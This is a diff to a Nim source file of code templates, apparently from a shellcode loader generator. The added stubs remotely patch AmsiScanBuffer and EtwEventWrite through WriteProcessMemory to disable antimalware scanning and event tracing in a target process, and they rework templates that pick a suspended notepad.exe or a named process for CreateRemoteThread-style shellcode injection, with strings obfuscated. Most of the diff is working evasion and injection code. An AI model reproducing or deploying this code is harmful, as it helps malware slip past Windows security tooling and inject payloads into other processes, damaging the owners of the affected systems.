@@ -411,15 +411,92 @@ when isMainModule:
     echo obf("[*] ETW blocked by patch: ") & fmt"{bool(success)}"
 """
 
+let RemotePatchAMSIStub* = """
+
+proc RemotePatchAmsi(hProcss :HANDLE): bool =
+
+    when defined amd64:
+        let patch: array[6, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3]
+    elif defined i386:
+        let patch: array[8, byte] = [byte 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00]
+
+
+    var disabled: bool = false
+   
+    var RemoteHandle = GetRemoteModuleHandle(hProcss, obf("amsi.dll"))
+    if RemoteHandle == 0:
+        echo obf("[X] Failed to get amsi.dll handle")
+        return disabled
+
+    var RemoteProc = GetRemoteProcAddress(hProcss, RemoteHandle,obf("AmsiScanBuffer"))
+    if RemoteProc == NULL:
+        echo obf("[X] Failed to get the address of 'AmsiScanBuffer'")
+        return disabled
+
+    if WriteProcessMemory(hProcss, RemoteProc, unsafeAddr patch, cast[SIZE_T](patch.len), NULL) == 0:
+        echo obf("Failed to write process memory")
+        return disabled
+    else:
+        disabled = true
+    return disabled
+
+when isMainModule:
+    var hProcams = OpenProcess(PROCESS_ALL_ACCESS, FALSE, remoteProcID)
+    success = RemotePatchAmsi(hProcams)
+    echo obf("[*] AMSI disabled in the remote process: ") & fmt"{bool(success)}"
+
+"""
+
+let RemotePatchETWStub* = """
+
+proc RemotePatchEtw(hProcess : HANDLE) : bool =
+
+    when defined amd64:
+        let patch: array[1, byte] = [byte 0xc3]
+    elif defined i386:
+        let patch: array[4, byte] = [byte 0xc2, 0x14, 0x00, 0x00]
+
+    
+    var disabled: bool = false
+    var RemoteHandle = GetRemoteModuleHandle(hProcess, obf("ntdll.dll"))
+    if RemoteHandle == 0:
+        echo obf("[X] Failed to get ntdll.dll handle")
+        return disabled
+
+    var RemoteProc = GetRemoteProcAddress(hProcess, RemoteHandle,obf("EtwEventWrite"))
+    if RemoteProc == NULL:
+        echo obf("[X] Failed to get the address of 'EtwEventWrite'")
+        return disabled
+
+    if WriteProcessMemory(hProcess, RemoteProc, unsafeAddr patch, cast[SIZE_T](patch.len), NULL) == 0:
+        echo obf("Failed to write process memory")
+        return disabled
+    else:
+        disabled = true
+    return disabled
+
+when isMainModule:
+    var hProcetw = OpenProcess(PROCESS_ALL_ACCESS, FALSE, remoteProcID)
+    success = RemotePatchEtw(hProcetw)
+    echo obf("[*] ETW disabled in the remote process: ") & fmt"{bool(success)}"
+
+"""
+
+
+let NotepadProcIDStub * = """
+
+# Under the hood, the startProcess function from Nim's osproc module is calling CreateProcess() :D
+let tProcess = startProcess(obf("notepad.exe"))
+tProcess.suspend() # That's handy!
+tProcess.close()
+
+echo obf("[*] Target Process: "), tProcess.processID
+var remoteProcID = DWORD(tProcess.processID)
+
+"""
+
 let ShellcoderemoteinjectStub_notepad * = """
 proc injectCreateRemoteThread(friendlycode: openarray[byte]): void =
-
-    # Under the hood, the startProcess function from Nim's osproc module is calling CreateProcess() :D
-    let tProcess = startProcess(obf("notepad.exe"))
-    tProcess.suspend() # That's handy!
-    defer: tProcess.close()
-
-    echo obf("[*] Target Process: "), tProcess.processID
 
     var cid: CLIENT_ID
     var oa: OBJECT_ATTRIBUTES
@@ -453,21 +530,25 @@ proc FindPidByName * (processName : string):DWORD =
     except: 
         echo obf("Process ID not found")
 
-proc injectCreateRemoteThread(friendlycode: openarray[byte]): void =
+var processID: DWORD
+"""
 
-    var processID: DWORD
+let ShellcoderemoteinjectStub_customprocID * = """
+var found: bool = false
+for m in remoteprocesses:
+    if found == true: continue
+    echo obf("Checking: ") & $m
+    processID = FindPidByName(m)
+    if (processID):
+        found = true
+
+echo obf("[*] Target Process: "), processID
+var remoteProcID: DWORD = processID
 """
 
 let ShellcoderemoteinjectStub_customprocthird * = fmt"""
-    var found: bool = false
-    for m in remoteprocesses:
-        if found == true: continue
-        echo obf("Checking: ") & $m
-        processID = FindPidByName(m)
-        if (processID):
-            found = true
 
-    echo obf("[*] Target Process: "), processID
+proc injectCreateRemoteThread(friendlycode: openarray[byte]): void =
 
     var cid: CLIENT_ID
     var oa: OBJECT_ATTRIBUTES
